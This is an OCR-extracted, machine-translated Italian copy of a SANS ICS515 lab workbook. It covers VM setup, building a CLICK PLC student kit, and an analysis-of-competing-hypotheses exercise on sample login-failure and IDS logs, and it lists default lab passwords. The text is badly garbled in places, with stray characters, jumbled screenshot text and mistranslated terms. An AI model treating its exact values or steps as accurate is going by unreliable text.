PP» FW WD WD Ww wh Ww ew lw lel lk lw OleOle lle
 Noi
 I.C.S.515 | I.C.S. VISIBILITÀ, RILEVAMENTO E RISPOSTA GIAC Response and Industrial Defence (GRID)
 Cartella di lavoro
 GIAC
 CERTIFICAZIONI
 NANS
 LA FONTE PIÙ AFFIDABILE PER LA FORMAZIONE, LA CERTIFICAZIONE E LA RICERCA SULLA SICUREZZA DELLE INFORMAZIONI | sans.org
 Risorse gratuite sulla sicurezza informatica
 sans.org/free
 Gli istruttori e gli analisti SANS producono migliaia di risorse e strumenti gratuiti per la comunità della sicurezza informatica, inclusi più di 150 strumenti gratuiti e centinaia di white paper
 scritto ogni anno. SANS continua a impegnarsi a fornire istruzione e capacità gratuite ai cittadini
 comunità informatiche che serviamo, formiamo e certifichiamo.
 Risorse gratuite della community sulla sicurezza informatica
 Internet Storm Center: servizio gratuito di analisi e avvisi
 Libri bianchi - Ricerca InfoSec sulla comunità
 Blog - Blog sulla sicurezza informatica
 Newsletter - Newsbites; @Rischio; AHIA!
 Webcast: in diretta e archiviati
 S0O@Oo®
 Poster: risorse incentrate sul lavoro

=]) Sfida di hacking natalizio SANS
= Controlli di sicurezza critici - Azioni consigliate per
 Difesa informatica
 S Strumenti gratuiti: gli istruttori SANS hanno creato più di 150 strumenti open source che supportano il tuo lavoro e ti aiutano a implementare una migliore sicurezza
 ee un (cioè)
(©) (fon) (£5)
(©) oy) Gp)
 Unisciti alla comunità degli ex studenti SANS online

“Come al solito, i corsi SANS si ripagano da soli entro il secondo giorno.
 Entro il terzo giorno, non vedi l'ora di tornare in ufficio per mettere in pratica ciò che hai imparato.
 it Evans, Hewlett Packard Enterprise -
 Servizi di investigazione digitale
 Formazione ed eventi gratuiti
> Test Drive di oltre 45 corsi SANS

>> Summit e forum SANS gratuiti

» Sfide informatiche Cattura la bandiera

» Assi informatici
 GIAC
 CERTIFICAZIONI
 NANS
 Www.sans.org
 Vm AY UU
 1CS515| I.C.S. VISIBILITÀ, RILEVAMENTO E RISPOSTA GIAC Response and Industrial Defence (GRID)
 Cartella di lavoro
 GIAC
 CERTIFICAZIONI
 NANS
 LA FONTE PIÙ AFFIDABILE PER LA FORMAZIONE, LA CERTIFICAZIONE E LA RICERCA SULLA SICUREZZA DELLE INFORMAZIONI | sans.org
 NON phyfyjy mt
 1CS515| I.C.S. VISIBILITÀ, RILEVAMENTO E RISPOSTA GIAC Response and Industrial Defence (GRID)
 Cartella di lavoro
 GIAC
 CERTIFICAZIONI
 SAN
 LA FONTE PIÙ AFFIDABILE PER LA FORMAZIONE, LA CERTIFICAZIONE E LA RICERCA SULLA SICUREZZA DELLE INFORMAZIONI | sans.org

© 2021 Robert M. Lee. Tutti i diritti riservati a Robert M. Lee e/o al SANS Institute.
 SI PREGA DI LEGGERE I TERMINI E LE CONDIZIONI DEL PRESENTE CONTRATTO DI LICENZA DEL CORSO
"CLA") CON ATTENZIONE PRIMA DI UTILIZZARE QUALSIASI CORSO ASSOCIATO AL CORSO SANS. QUESTO È UN CONTRATTO LEGALE ED ESECUTIVO TRA TE (L'UTENTE) E SENZA ISTITUTO PER IL CORSO. ACCETTI CHE IL PRESENTE CONTRATTO È ESECUTIVO COME QUALSIASI ACCORDO NEGOZIATO SCRITTA FIRMATO DA TE.
 Con questo CLA, SANS Institute concede all'Utente una licenza personale e non esclusiva per utilizzare il Courseware in conformità ai termini del presente accordo. Il Courseware include tutto il materiale stampato, inclusi libri di testo e cartelle di lavoro di laboratorio, nonché qualsiasi supporto digitale o di altro tipo, macchina virtuale e/o set di dati distribuiti da SANS Institute all'Utente per l'utilizzo nella classe SANS associata al Courseware. L'utente accetta che il CLA costituisce la dichiarazione completa ed esclusiva dell'accordo tra SANS Institute e l'utente e che questo CLA sostituisce qualsiasi proposta, accordo o altra comunicazione orale o scritta relativa all'oggetto del presente CLA.
 ACCETTANDO QUESTO CORSO, L'UTENTE ACCETTA DI ESSERE VINCOLATO AI TERMINI DEL PRESENTE CLA. ACCETTANDO QUESTO SOFTWARE, L'UTENTE ACCETTA CHE QUALSIASI VIOLAZIONE DEI TERMINI DEL PRESENTE CLA PUÒ CAUSARE DANNI IRREPARABILI E LESIONI SIGNIFICATIVE A SANS INSTITUTE E CHE IL SANS INSTITUTE PUÒ APPLICARE QUESTE DISPOSIZIONI MEDIANTE INGIUNZIONE (SENZA NECESSITÀ DI POSTARE CAUZIONE) PRESTAZIONI SPECIFICHE O ALTRO RILIEVO EQUO.
 Se l'Utente non è d'accordo, può restituire il Courseware al SANS Institute per un rimborso completo, se applicabile.
 L'utente non può copiare, riprodurre, ripubblicare, distribuire, visualizzare, modificare o creare opere derivate basate su tutto o parte del Courseware, su qualsiasi supporto sia stampato, elettronico o altro, per qualsiasi scopo, senza il previo consenso scritto dell'Istituto SANS. Inoltre, l'Utente non può vendere, affittare, noleggiare, scambiare o trasferire in altro modo il Courseware in alcun modo, forma o formato senza l'espresso consenso scritto di SANS Institute.
 Se una qualsiasi disposizione del presente CLA viene dichiarata inapplicabile in qualsiasi giurisdizione, tale disposizione sarà considerata separabile dal presente CLA e non pregiudicherà il resto dello stesso. Un emendamento o un'addendum al presente CLA potrebbe accompagnare il presente Courseware.SANS riconosce che tutti i software e/o strumenti, grafica, immagini, tabelle, diagrammi o grafici presentati in questo Courseware sono di proprietà esclusiva dei rispettivi proprietari di marchi/registrati/copyright, tra cui:
 AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Torna al mio Mac, Boot Camp, Cocoa, FaceTime, FileVault, Finder, FireWire, logo FireWire, iCal, iChat, iLife, iMac, iMessage , iPad, iPad Air, iPad Mini, iPhone, iPhoto, iPod, iPod classic, iPod shuffle, iPod nano, iPod touch, iTunes, logo iTunes, iWork, portachiavi, Keynote, Mac, logo Mac, MacBook, MacBook Air, MacBook Pro , Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, Retina, Safari, Siri, Spaces, Spotlight, C'è un'app per questo, Time Capsule, Time Machine, Touch ID, Xcode, Xserve, App Store, e iCloud sono marchi registrati di Apple Inc.
 PMP® e PMBOK® sono marchi registrati di PMI.
 SOF-ELK@ è un marchio registrato di Lewes Technology Consulting, LLC. Utilizzato con permesso.
 SIFT@ è un marchio registrato di Harbingers, LLC. Utilizzato con permesso.
 Legge applicabile: il presente Contratto sarà regolato dalle leggi dello Stato del Maryland, USA.
 I.C.S.515_W_G01_09 wwe Ww

|
 Ww & WwW WS WS WwW W
 noi noi w&
 ww wow Ww noi ww
 Obiettivi
 Prepararsi per i laboratori in classe Registrare gli account necessari
 Compito: prepararsi per i laboratori di classe:
 Trasferisci i file della lezione sul tuo computer
> Ti verrà fornito un collegamento per il download dei file multimediali del corso nel tuo portale SANS
> C'è una cartella zip nei file multimediali del corso, trasferiscila sul tuo sistema host Estrai il contenuto del file zip
> Estrai il contenuto del file zip sul tuo sistema host i. Puoi scegliere qualsiasi posizione desideri, ad esempio Installazione desktop VMWare Player
> Puoi utilizzare la tua versione professionale o installare una versione di prova dal loro sito web e Non è necessaria la versione a pagamento per completare il corso
> Gli utenti Windows utilizzeranno VMWare Player e gli utenti Mac utilizzeranno VMWare Fusion Carica le macchine virtuali
> Una volta estratti i dati caricare la Macchina Virtuale Windows e il RELI.C.S. Macchina virtuale per garantire che la virtualizzazione funzioni sulla tua workstation i. Se riscontri errori che non riesci a risolvere, chiedi al tuo istruttore (lezione dal vivo) o al contatto OnDemand. I problemi più comuni includono la mancata estrazione dei file e il tentativo di eseguire la VM dall'interno del file zip o la mancata abilitazione della virtualizzazione sul sistema host che richiede una modifica nel BIOS. Questo dipende dal sistema host
> Una volta verificato l'avvio delle macchine virtuali, il gioco è fatto; non è necessario effettuare il login o continuare, si tratta solo di un controllo per garantire che la virtualizzazione funzioni per te e che tu sia pronto per procedere con i laboratori
> Se desideri accedere alle VM le credenziali sono: Windows VM e Username = sansics e Password = sansics RELI.C.S. VM e Username = reliquie e Password = reliquie

© 2021, Robert M. Lee LabO-1 vw WV wo oY we ew ew
 wv ww WY Ww WW
 siamo noi ww noi Ww

)
 È
 a3
 Obiettivi
 e Costruire il SANS515 Student Kit (PLC) e Caricare la logica di configurazione del test hardware sul PLC

*Informazioni sullo scenario* Nel contesto dello scenario dei giorni 1-5, il PLC e la relativa rete a cui avrai accesso fisico sono le operazioni di alimentazione di Calistoga che coprono la generazione di energia, la trasmissione di energia e la distribuzione di energia. Tecnicamente si tratta di 3 operazioni di potenza, quindi per brevità faremo riferimento a Calistoga 3 Power Operations (C3PO).
 Nota: la configurazione delle impostazioni di rete della macchina virtuale (VM) è fondamentale per il successo del laboratorio ed è un problema comune di risoluzione dei problemi per gli studenti. Verificare l'intervallo di indirizzi IP e assicurarsi che la scheda di interfaccia di rete (NIC) della VM sia in modalità Bridge quando richiesto nella procedura dettagliata del lab. I seguenti sono comuni
 percorsi di risoluzione dei problemi da considerare in caso di problemi. Segui la procedura dettagliata e torna a questi se necessario.
 Percorsi generali di risoluzione dei problemi:
 1. Assicurarsi che nel software Click il tipo di porta sia Ethernet
 2. Assicurarsi che le impostazioni della VM siano in modalità Bridged
 3. Assicurati che quando il kit è collegato sia connesso alla tua macchina host (non alla VM)
 4. In rari casi potrebbe essere necessario disabilitare il software antivirus sul tuo host o inserire nella lista bianca le applicazioni
 5. Se la connettività Bridge non funziona, connettersi invece alla VM e modificare l'indirizzo IP di Windows nell'intervallo 169.254.x.x/16
 6. Se sul PLC è presente una spia rossa "err", scollegare e ricollegare l'alimentazione al PLC
 7. In alcuni casi, il cambio delle porte USB su una macchina consente la funzionalità prevista per la connettività del kit
 8. In VMWare Workstation Pro 16 è necessario configurare le impostazioni di bridging automatico. Nel Player vedi "Configura adattatori" direttamente nelle Impostazioni VM. In Pro si trova in un'impostazione globale dedicata in Modifica > Editor di rete virtuale > Modifica impostazioni > Impostazioni automatiche
 9. Cambia la rete da Bridge a NAT e di nuovo a Bridge (aiuta con possibili problemi della VM)
 10.Riavvia il kit, riavvia la VM, assicurati che il PLC sia impostato per funzionare, quindi chiedi aiuto a un istruttore
 Questo esercizio utilizzerà la macchina virtuale Windows e il kit SANS I.C.S.515 Student.

© 2021, Robert M. Lee Lab 1.1-1 1. Cosa altera l'interruttore Sim 2 quando la logica viene caricata nel controller logico programmabile (PLC)?
 Attività: creare il SANS515 Student Kit (PLC)

*Nota* Per prima cosa disimballare tutti i materiali.

> Il kit per studenti contiene: CLICK PLC Pro con modulo C2-O8DR-6V Scheda di ingresso/uscita CLICK CO-O8CDR Scheda di simulazione CLICK CO-O8SIM Scheda a circuiti stampati SANS 1CS515 Cavo Ethernet da 1 piede Adattatore da USB a Ethernet Tre cablaggi della morsettiera Alimentazione internazionale
> Dopo aver rimosso tutti gli elementi dalla scatola del kit studentesco, salva la scatola perché potrebbe servirti per conservare o spedire il kit studentesco in futuro.
> Collegare il cablaggio di ingresso/uscita del processo
>> La scheda del kit studente contiene quattro punti di connessione nella parte superiore della scheda
 VVVVVVVV

> Con il kit studente sono stati forniti tre cablaggi della morsettiera che si collegano ai quattro punti di connessione sul circuito

© 2021, Robert M. Lee Lab 1.1-2
 oud bbb wb wb &
 uwww
 vu bv vb &
 vu J Jv VY WY
 u.a
 io. Collegare i quattro connettori dei fili alle rispettive posizioni sulle schede studenti ii. Ciascun connettore si inserisce solo in un punto sulla scheda e in una direzione iii. Collegare le morsettiere ai moduli CLICK PLC iv. Ciascuna morsettiera può essere occupata solo in una posizione sui moduli PLC
** Assicurarsi che le tre morsettiere siano inserite completamente nel PLC
 iv v. ee
 eee

> Collegare l'alimentazione
> Disimballare l'alimentatore universale
> Inserisci l'alimentatore appropriato in base alla regione in cui ti trovi e collegalo a una fonte di alimentazione appropriata
> Collegare l'alimentazione al modulo di alimentazione nell'angolo in alto a destra della scheda del kit studente

© 2021, Robert M. Lee Lab 1.1-3 Ss ses 8s» & 8 @2 @ @ @ dD O@ DD OO OD OO 8 DD DB DB HB BD H wB
 4
 Laboratorio 1.1 --

© 2021, Robert M. Lee
 La scheda dovrebbe accendersi e assomigliare all'immagine sopra.

> vw vw wwe noi He noi ee noi noi
 Attività: connettersi al PLC e caricare la logica di convalida dell'hardware

> Collega il Kit Studente I.C.S.515 (Kit) al tuo laptop
> Individua l'adattatore da USB a Ethernet (adattatore Atolla fornito nel kit dello studente)
> Individua il cavo Ethernet da 90 cm fornito nel kit dello studente.
> Collegare il cavo Ethernet all'adattatore USB e all'interfaccia CLICK Ethernet
> Collega il cavo USB che collega il Kit al tuo laptop (è stato fornito l'adattatore USB C)

*Nota* Le impostazioni di rete VM per il corso richiederanno una connessione di rete fisica dalla workstation host al PLC e le macchine virtuali saranno entrambe impostate in modalità Bridge per utilizzare una connessione fisica comune dall'host. Se richiesto quando si collega l'adattatore da USB a Ethernet, è necessario connettersi sempre all'Host (non alla VM). Modifichiamo anche le impostazioni di connessione del bridge per garantire che la VM non tenti di utilizzare un adattatore diverso quando tenta di comunicare con il PLC.
 Avvia VMWare Player
 Seleziona la VM Win e quindi modifica le impostazioni della macchina virtuale
 Assicurati che l'adattatore di rete VM sia in modalità Bridged e seleziona l'opzione "configura adattatori" per selezionare l'adattatore di rete corretto.
 Selezionare Sì nel prompt dell'UAC
 VvVVV
 Controllo dell'account utente
 Vuoi consentire a questa app di apportare modifiche al tuo dispositivo?
 Questo prodotto VMware richiede privilegi di amministratore. Se si fa clic su Annulla, l'applicazione avrà funzionalità limitate.
 Editore verificato: VMware, Inc. Origine del file: disco rigido su questo computer
 Mostra più dettagli

> Deseleziona tutte le interfacce, tranne l'interfaccia ASIX.
> Al termine, selezionare OK

© 2021, Robert M. Lee Lab 1.1-5 Riepilogo ~ - Stato del dispositivo 46 GB | lv] Connesso
{Processori 2 | collegare all'accensione E)Hard Disk (SCST) 100 GB |
©) CD/DVD (SATA) Datazione automatica | Connessione di rete
"2 Adattatore di rete a ponte (automatico) | @bridged: connesso direttamente alla rete fisica
= |
(usa Controller presente | Replica lo stato della connessione di rete fisica
) Rilevamento automatico scheda audio presente | Configura adattatori Rilevamento automatico NAT: utilizzato per condividere l'indirizzo IP dell'host
| Solo Qhost: una rete privata condivisa con l'host LO Octo: Sari virtual notore
| Impostazioni bridging automatico x Ee i | Seleziona gli adattatori di rete host che desideri collegare automaticamente:
| [ASI AX88179 Adattatore da USB 3.0 a Gigabit Ethernet 3 t
| [J Adattatore virtuale Microsoft Wi-Fi Direct n.2
| Microsoft Wi-Fi Direct Virtual Adapter LAN Seaments...] [Avanzato

|

|
 Adattatore di rete wireless Killer(R) Wi-Fi 6 AX16S0w 160 MHz (20002 W)
| {_]killer € 3100x Controller Ethernet da 2,5 Gigabit (2)
 Dispositivo Bluetooth (rete area personale)
 Annulla Aiuto

*Nota* I passaggi per aggiungere e configurare l'adattatore USB all'host e impostare il bridging VM varieranno se utilizzi VM Workstation Professional o VM Fusion. I passaggi forniti in questo lab sono specifici di VM Player.

> Avvia l'I.C.S.515 Windows VM, se viene richiesto di scaricare gli strumenti VM selezionare "ricordamelo più tardi"
> Accedi alla macchina VM Windows

> ACCEDI =sansics

> PASSWORD = sansics

> Caricare un file logico di convalida hardware nel PLC
> Individua il file dello studente: "I.C.S.515 Mfg V3 for Production Boards.ckp"

© 2021, Robert M. Lee Lab 1.1-6
 uwdedds wb ww
 oe ww wu Ww
 Oh
 Se noi & ww W@W VU Ww W
 Condividi vista

> File degli studenti
 Nome st Accesso rapido Bl Desktop * I.C.S.515 Mfg V3 for Production Boards.ckp I.C.S.515 OEM Change V2.ckp
& Download "
= Test di accettazione del sito I.C.S.515 V1.ckp

> Fare doppio clic sul file e verrà avviato il pacchetto software di programmazione CLICK
 Software di programmazione CLICK (Versione 201) - I.C.S.515V8 per Production Boards.ckp ~ [Programma principale] -
 Programma Funzione PLC
{ Bey PemoteCommwt » Cale 1 transalarms Inizializza
 Sy Trasmissione 'A Contatto (NC) Sey Transta
 chiamo "(Contatto Bl Edge
— Ben di Modifica gradino I commenti possono:
 Ld Controllo della sintassi della generazione di informazioni sul programma locale

| Chiamata per visualizzazione riferimento incrociato 8B

= Monitor ——— Gen_Fuel_Controt

|| Monitoraggio dello stato BR
| e Visualizzazione dati
 TBrosting punto Me Diet Alasci

> Quando si apre l'applicazione, trova nel menu in alto l'icona con la freccia rossa verso il basso che ti serve
 Scrivere un progetto in un PLC
 Scrivi progetto nel PLC (Shift+F9)
 Pio hc, AMOR AKIE 8)

© 2021, Robert M. Lee Lab 1.1-7
> Apparirà una schermata di connessione, potrebbe essere necessario selezionare Ethernet nel menu a discesa Tipo di porta e potrebbe essere necessario selezionare l'adattatore di rete appropriato nel menu a discesa Adattatore di rete. L'adattatore potrebbe apparire come un adattatore di rete Intel a causa della configurazione del bridge nelle impostazioni della VM.

> Dovresti vedere un PLC che è stato scoperto.

> Fare clic sul pulsante Connetti Risoluzione dei problemi Nota: con alcune configurazioni delle workstation degli studenti abbiamo osservato la necessità di modificare l'indirizzo IP dell'adattatore VM Windows per allinearlo all'intervallo DHCP predefinito del clic. Impostazione temporanea dell'adattatore VM Windows sullo stesso intervallo 169.254, scrittura della logica nel PLC e quindi ripristino dell'impostazione 192.168.0.8.

|Collegarsi al CLICK PLC x
 Connessione diretta Posizione del PLC CLICK di destinazione
 Tipo di porta: Ethernet a
@ Nella stessa LAN (scansiona automaticamente tutti i PLC CLICK nella LAN,
= ior ba stessa LAN (scansiona n automaticamente.)
) e un pres Vedere sì “rs Re C9) QAll'esterno di questa LAN (è necessario assegnare manualmente l'indirizzo IP e il numero di porta.) Lech PLC Name Indirizzo IP Subnet Mask PartNumber Modalità firmware = Stato Indirizzo Mac et rcoieeg? isagatons Ps h499,254,39.254 1255.255.0.0 | ver3.00
 Maschera di sottorete: 255.255.255.0 Gateway predefinito: 192.168.0.10
 Aggiorna Lampeggia i LED RUN ed ERR Modifica...

> Potrebbe essere richiesto di fornire una password di autenticazione. Per un PLC completamente pulito inseriremo “click” come password. Per un PLC che è stato inizializzato durante il processo di creazione del kit SANS Student potrebbe essere necessario inserire "sansics123"
 Accedi x Accedi x Inserisci nome utente e password, Inserisci nome utente e password. eae Ss Nome utente: | adel eee | Parola d'ordine: | sansics 123. rs M Visualizza password Password predefinita di fabbrica = “dick” Password predefinita di fabbrica = “dick” Tentativo di accesso non riuscito: 1 di 3 Password dimenticata? Ha dimenticato la password?
 ET] fea [oc coreet

> Con la password corretta inserita, inizierà il processo di scrittura del progetto sul PLC. Ti verrà richiesto di scrivere il progetto. Se viene richiesto di eseguire una modifica in fase di esecuzione, è possibile selezionare Sì oppure ruotare l'interruttore sul PLC CLICK su Stop e quindi selezionare Ok.

© 2021, Robert M. Lee Lab 1.1-8 4B we wa ww

“Bs 4B’

"sì è"
 o noi w ww
 Scrivi il progetto nel PLC
 PC—
 Nome del progetto: {I.C.S.515 Mfg V3 per schede di produzione | Dimensioni del programma (totale: 8.000 passaggi)
 Dimensioni WiProgram: 26 passi (3,31%) Area GiFree: 7.735 passi (96,69%)
 0 8.000 |

| (File di progetto (totale: 262, 144 byte) 1
 Dimensione file GiProject 17.372 byte ( 6,62 %) Area GiFree: 244.772 byte ( 93,38 %) |
| i ee Q 262,144 | Ultimo aggiornamento: 07 luglio 2021, 19:06:00 scrive il file di progetto nel PLC
 Abilitando questa opzione, il file di progetto verrà scaricato (Scrittura) nel PLC. Se vuoi disabilitare il caricamento del progetto (lettura), disabilita questa opzione.

> Una volta completata la scrittura del progetto, potresti ricevere una notifica che la comunicazione è stata persa. Ciò è dovuto alla modifica dell'indirizzo IP del PLC. L'indirizzo per il PLC è stato impostato quando
 Ultimo aggiornamento: ee ney cee etn
 PLC
 cPUTipo: §—[C2-01CPU
 NomeProgetto: [io
 Dimensioni del programma (totale: 8.000 passaggi)
 Dimensioni WliProgram: Ossteps (0,00%) Area UiFree: 8.000 passi (100,00%)
 0 8.000
 File di progetto (totale: 262, 144 byte)
 Il file di progetto non è stato scaricato in questo modulo CPU.
 Modifica tempo di esecuzione
 Questo modulo CPU non supporta la modifica del tempo di RUN.
 la logica è stata caricata sul PLC. Seleziona semplicemente Riconnetti.
 Fare clic sul software di programmazione

: La sessione di programmazione sul PLC è terminata
!\ disconnesso. Riconnettiti o scegli
 per lavorare offline.

© 2021, Robert M. Lee
 Laboratorio 1.1-9 Attività: verifica degli elementi hardware
 Cosa altera il Sim Switch 2 quando la logica viene caricata nel controller logico programmabile (PLC)?
 l'intersezione
 Posizionare l'interruttore del PLC su Run Con la logica di convalida hardware caricata nel PLC, testare ogni elemento.
 Partendo dal quadrante di generazione in alto a sinistra del circuito:
> Premi il pulsante Apri interruttore del piazzale: questo dovrebbe testare l'indicatore di chiusura
> Premi il pulsante Chiudi interruttore del piazzale: questo dovrebbe testare l'indicatore Intertie
 Spostarsi in alto a destra Quadrante di trasmissione del circuito:
> Premere il pulsante Apri interruttore: questo dovrebbe testare l'indicatore Chiudi
> Premere il pulsante Chiudi interruttore: questo dovrebbe testare l'indicatore di ripristino del relè di protezione
> Premere il pulsante Guasto relè di protezione: questo dovrebbe testare l'indicatore della regione di servizio residenziale superiore
> Premere il pulsante di reset del relè di protezione: questo dovrebbe testare l'indicatore della regione di servizio residenziale centrale
 Spostarsi in basso a destra nel quadrante di distribuzione del circuito:
> Premere il pulsante Richiusura aperta: questo dovrebbe testare l'indicatore della regione di servizio residenziale inferiore
> Premere il pulsante Chiusura richiusura: questo dovrebbe testare l'indicatore di stato del servizio clienti industriale
> Ruota il potenziometro di distribuzione: questo dovrebbe aumentare l'indicatore di produzione MW della generazione di energia. Gira fino al massimo
 Spostarsi nel quadrante Industry in basso a sinistra del circuito:
> Ruota il potenziometro di settore: questo dovrebbe aumentare il display a sette segmenti su un valore. Gira fino al massimo
 A questo punto tutti gli indicatori sulla scheda dovrebbero essere verdi e l’indicatore di uscita MW dovrebbe essere acceso e il display a sette segmenti dovrebbe mostrare un valore
 Ora testeremo ciascun interruttore sul modulo di simulazione PLC
 Gira l'interruttore 1 a destra: l'interruttore del piazzale dovrebbe essere rosso e chiuso
 Ruota l'interruttore 2 verso destra: l'indicatore di intertie dovrebbe essere rosso
 Ruotare l'interruttore 3 a destra: l'interruttore della trasmissione deve essere rosso e chiuso
 Ruotare l'interruttore 4 verso destra: il relè di protezione dovrebbe essere rosso e ripristinato
 Ruotare l'interruttore 5 a destra — L'indicatore dell'area di servizio residenziale superiore dovrebbe accendersi Ruotare l'interruttore 6 a destra — L'indicatore dell'area di servizio residenziale centrale dovrebbe accendersi Ruotare l'interruttore 7 a destra — L'indicatore dell'area di servizio residenziale inferiore dovrebbe accendersi Ruotare l'interruttore 8 a destra — Industria lo stato del servizio dovrebbe accendersi
 VVVVVVVV

© 2021, Robert M. Lee Lab 1.1-10
 ra] co ra]
 oo uwwnwwHwwo oO
 www
 Esercizi da asporto
 Lo scopo di questo esercizio era costruire il kit per studenti I.C.S.515 che verrà utilizzato per una serie di laboratori durante il corso I.C.S.515. Un altro scopo era familiarizzare gli studenti con le nozioni di base di un controller mostrando come i file logici vengono caricati su un dispositivo e come è possibile interagire con essi tramite il software di ingegneria.
 Puoi chiudere tutte le applicazioni aperte e aprire le finestre di esplorazione file all'interno di I.C.S. 515 Windows VM e quindi è possibile arrestare la VM Windows.

© 2021, Robert M. Lee Lab 1.1-11 we FF 8 8 wo ww © Ww wD Ww wo Ww
 ww ww

'=

_

___Lab 1.2 — Tecniche Analitiche Strutturate _
 e Sfrutta una delle tecniche analitiche strutturate più comuni: ACH

*Informazioni sullo scenario* Nel contesto degli scenari dal giorno 1 al giorno 5, i partecipanti assumono il ruolo di analista di intelligence sulle minacce per identificare il tipo di informazioni disponibili pubblicamente sulla loro organizzazione. Questo verrà utilizzato insieme ad altri dati di rete e sfruttato con l'analisi delle ipotesi concorrenti (ACH). Lo scopo di questo laboratorio è esercitare la mente analitica utilizzando ACH.
 Preparazione agli esercizi
 Questo esercizio non richiede alcuna preparazione né utilizza VM o dati di laboratorio.
 Attività: analizzare i dati provenienti dalla rete e dall'I.C.S. Vaso di miele

*Nota* Lo scenario del corso si svolge nella città di Calistoga con varie operazioni industriali. Tuttavia, non siamo ancora entrati nella rete delle raffinerie di petrolio o nelle reti di energia elettrica. Questo laboratorio utilizzerà la rete dei semafori per il controllo municipale della città. Questa rete non farà parte di uno scenario più ampio ma è utile per iniziare questo esercizio.

> Mappa della rete: questa è una vista della rete conosciuta, le reti dello scenario I.C.S.515 si trovano in altre strutture.

© 2021, Robert M. Lee Lab 1.2- 1
\Sig

«a7

'ar.'
 et rennin eeeennnennenrnininninemnn
{/
 Zappa
. ny ae Sarees
_— e ~ ~—
_" ae” hs : ea za | > et Business Dominio Windows 7 Utente controller utente Honeypot Windows7
 I.C.S. Rete di laboratori 515
 ics Trafficlight Trafficlight Traffictight + TrafficLight Storico dati Honeypot RTU TU RT RTu

*Nota* Di seguito sono riportati gli eventi di sistema osservati nei settori Business e I.C.S. reti. Gli indirizzi 192.168.10.0/24 sono la rete Imprese e 10.10.10.0/24 sono gli indirizzi I.C.S. asset di rete. Le informazioni sono a tua disposizione estratte dai formati appropriati (esempio: Syslog sarà più leggibile dall'uomo) e sono state archiviate nel database degli analisti di Network Security Monitoring.Ti viene chiesto di rivedere i dati, che normalmente è responsabilità di Network Security Monitoring, perché il team di Threat and Environment Manipulation ha analizzato un malware in circolazione (non trovato finora sulla rete) che tenta di accedere agli account e prende di mira specificamente I.C.S. ambienti. Ritengono che potrebbe essere sulla rete, ma il personale di Network Security Monitoring ritiene che non ci siano segni del malware. Invece, credono che probabilmente ci sia una minaccia interna. Ti è stato chiesto di correlare i dati e trarre una conclusione imparziale su una di quelle teorie o teorie alternative per aiutare a guidare la ricerca in corso dietro i dati anomali.
 1. Accessi non riusciti a livello di sistema
 e 1 dicembre 08:30:10 'Utente Windows 7': Jeff ACCESSO RIFIUTATO
 e 1 dicembre 08:30:32 'Utente Windows 7': Jeff ACCESSO RIFIUTATO
 e 3 dicembre 08:45:32 'Utente Windows 7': Jeff ACCESSO RIFIUTATO
 e December 8 01:01:11 'Domain Controller: Dan ACCESS REFUSED e December 8 01:01:16 'Domain Controller: Dan ACCESS REFUSED e December 8 01:01:21 'Domain Controller: Dan ACCESS REFUSED e December 8 01: 01:26 'Controllore di dominio: Dan ACCESSO RIFIUTATO e 8 dicembre 02:02:22 'I.C.S. Honeypot': ACCESSO Admin RIFIUTATO
 e 20 dicembre 10:20:13 'Business Honeypot': ACCESSO amministratore RIFIUTATO e 20 dicembre 10:22:40 'Utente Windows 7': Jeff ACCESSO RIFIUTATO e 20 dicembre 11:14:58 'I.C.S. Honeypot': ACCESSO Admin RIFIUTATO

© 2021, Robert M. Lee Lab 1.2- 2
 lm
 ew eo
 2. Avvisi del sistema di rilevamento delle intrusioni di rete
 1 dicembre 12:30:20 SEXTERNAL -> Utente Windows 7
 Messaggio: Tentativo di accesso alla porta 22
 3 dicembre 12:20:42 SBusiness -> Storico dati
 Messaggio: Porta 5450 flusso stabilito
 8 dicembre 00:20:55 SEXTERNAL -> SBusiness
 Messaggio: Scansione di rete sulla porta 22, porta 88 e porta 135 8 dicembre 02:02:22 SEXTERNAL -> I.C.S. Vaso di miele
 Messaggio: Avviso su qualsiasi comunicazione IP a Honeypot — Porta 502 8 dicembre 02:02:27 SEXTERNAL -> I.C.S. Vaso di miele
 Messaggio: Avviso di qualsiasi comunicazione IP con Honeypot — Porta 502 20 dicembre 10:20:13 SEXTERNAL -> Business Honeypot
 Messaggio: Avviso su qualsiasi comunicazione IP a Honeypot — Porta 22 20 dicembre 11:14:58 SBusiness -> I.C.S. Vaso di miele
 Messaggio: Alerted.on Any IP Communication to Honeypot - Port 22

> Dalle informazioni di cui sopra, pensa alle domande che vorresti porre a chi gestisce l'architettura o a chi esegue il monitoraggio della sicurezza della rete (chi ha stabilito le regole).
> Qual è a questo punto una teoria che hai:

© 2021, Robert M. Lee
 Lab 1.2- 3 Compito - Scegliere lo scenario più probabile

*Nota* Coloro che gestiscono l'architettura e coloro che eseguono il monitoraggio della sicurezza della rete hanno fornito informazioni aggiuntive.
 e Il normale orario lavorativo è dalle 8:00 alle 17:00; tuttavia, è sempre presente una persona, quindi potrebbero esserci comunicazioni in orari dispari
 e Gli avvisi IDS nell'I.C.S. sono configurati per avvisare ogni volta che qualcuno accede all'honeypot o al Data Historian; sono tuttavia consentite connessioni esterne a Data Historian. Questo viene fatto semplicemente per la tenuta dei registri
 e L'utente Dan è stato licenziato il 15 dicembre per aver costantemente mancato i controlli di sicurezza e conformità aziendali, incluso il download di software non autorizzato
 e Non esistono regole IDS per l'accesso a qualsiasi altro sistema I.C.S. dispositivi
 1. Utilizzando le informazioni disponibili e gli alert relativi alla rete e all'honeypot, compilare la Matrice Analisi delle Ipotesi Competenti con gli scenari possibili e lo scenario più probabile. L'unica colonna e le due righe di esempio vengono compilate per facilitare l'avvio.
 Il malware è_ | Un membro della rete | Minaccia presente Porta TCP 502 Regola IDS attivata nella rete honeypot
© 2021, Robert M. Lee Lab 1.2- 4
 ae ae @ >
 e.a

(FF)
 Dll è ee! De! OO2
 bs 'V S&S Se ww Ww
 oo FF ww Ww
 Esercizi da asporto
